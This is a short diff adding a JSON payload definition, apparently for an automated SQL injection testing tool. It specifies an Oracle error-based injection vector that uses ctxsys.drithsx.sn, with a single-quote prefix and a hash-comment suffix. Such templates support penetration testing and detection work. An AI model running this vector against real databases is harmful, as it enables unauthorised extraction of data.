@@ -1,0 +1,12 @@
+{
+ "dbms": "oracle",
+ "technique": "error",
+ "boundary": {
+  "prefix": "'",
+  "suffix": "#",
+  "type": "single-quote",
+  "desc": "single-quoted + hash comment"
+ },
+ "vector": "{B} AND 1=ctxsys.drithsx.sn(1,({Q}))",
+ "comment": "oracle error via single-quoted + hash comment"
+}
